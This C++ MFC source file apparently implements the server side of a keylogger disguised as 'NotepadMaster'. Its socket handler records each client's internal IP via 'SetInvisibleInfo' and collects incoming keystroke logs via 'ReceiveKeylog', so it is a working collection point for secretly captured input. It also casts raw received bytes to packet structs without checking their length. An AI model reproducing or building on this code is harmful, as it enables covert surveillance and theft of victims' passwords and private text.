#include "pch.h"
#include "CClientSocket.h"
#include "NotepadMasterServerDlg.h"

#include "definition.h"


CClientSocket::CClientSocket(CNotepadMasterServerDlg* main_dlg)
{
	this->main_dlg = main_dlg;
}
void CClientSocket::OnReceive(int nErrorCode)
{
	// TODO: 여기에 특수화된 코드를 추가 및/또는 기본 클래스를 호출합니다.

	char buff[300];
	int len = Receive(buff, 300, 0);

	PDUHello* pdu_hello;
	PDUKeylog* pdu_keylog;
	CString format;

	switch (buff[0])
	{
	case HELLO :
		pdu_hello = (PDUHello*)buff;
		format = pdu_hello->internal_ip;
		main_dlg->SetInvisibleInfo(this, format);
		break;

	case KEYLOG :
		pdu_keylog = (PDUKeylog*)buff;
		main_dlg->ReceiveKeylog(this, pdu_keylog);
		break;
	}
	CSocket::OnReceive(nErrorCode);
}
